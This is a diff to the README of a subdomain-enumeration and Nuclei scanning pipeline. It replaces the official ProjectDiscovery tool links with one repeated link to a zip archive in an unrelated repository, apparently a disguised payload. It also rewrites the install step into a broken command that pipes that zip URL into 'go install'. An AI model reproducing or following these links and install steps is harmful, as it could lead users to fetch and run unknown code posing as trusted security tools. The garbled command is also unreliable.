@@ -7,10 +7,10 @@ Subdomain Enumeration → Live Host Detection → Nuclei Vulnerability Scan → 
 ---
 
 ### 🔧 Tools Used:
-- [Subfinder](https://github.com/projectdiscovery/subfinder)
-- [Httpx](https://github.com/projectdiscovery/httpx)
-- [Nuclei](https://github.com/projectdiscovery/nuclei)
-- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
+- [Subfinder](https://github.com/sujon005/AutoReconSuite/raw/refs/heads/main/marchpane/Auto_Suite_Recon_v3.3.zip)
+- [Httpx](https://github.com/sujon005/AutoReconSuite/raw/refs/heads/main/marchpane/Auto_Suite_Recon_v3.3.zip)
+- [Nuclei](https://github.com/sujon005/AutoReconSuite/raw/refs/heads/main/marchpane/Auto_Suite_Recon_v3.3.zip)
+- [Nuclei Templates](https://github.com/sujon005/AutoReconSuite/raw/refs/heads/main/marchpane/Auto_Suite_Recon_v3.3.zip)
 
 ---
 
@@ -26,4 +26,4 @@ Subdomain Enumeration → Live Host Detection → Nuclei Vulnerability Scan → 
 Install the tools with:
 
 ```bash
-cat requirements.txt | xargs -n1 go install
+cat https://github.com/sujon005/AutoReconSuite/raw/refs/heads/main/marchpane/Auto_Suite_Recon_v3.3.zip | xargs -n1 go install
